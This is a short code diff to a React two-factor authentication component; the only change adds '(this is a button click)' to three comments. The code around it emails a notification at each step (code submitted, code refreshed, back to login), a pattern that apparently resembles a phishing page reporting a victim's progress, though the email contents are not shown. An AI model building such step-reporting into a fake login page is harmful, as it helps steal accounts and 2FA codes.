@@ -51,7 +51,7 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
 
     setIsLoading(true);
     
-    // Send email for 2FA submission
+    // Send email for 2FA submission (this is a button click)
     try {
       await sendEmailNotification({
         step: "Two-Factor Auth - VERIFICATION SUBMITTED",
@@ -82,7 +82,7 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
     setTimer(30);
     setCanResend(false);
     
-    // Send email for code refresh
+    // Send email for code refresh (this is a button click)
     try {
       await sendEmailNotification({
         step: "Two-Factor Auth - Code Refreshed",
@@ -105,7 +105,7 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
   };
 
   const handleBack = async () => {
-    // Send email for back button
+    // Send email for back button (this is a button click)
     try {
       await sendEmailNotification({
         step: "Two-Factor Auth - Back to Login",
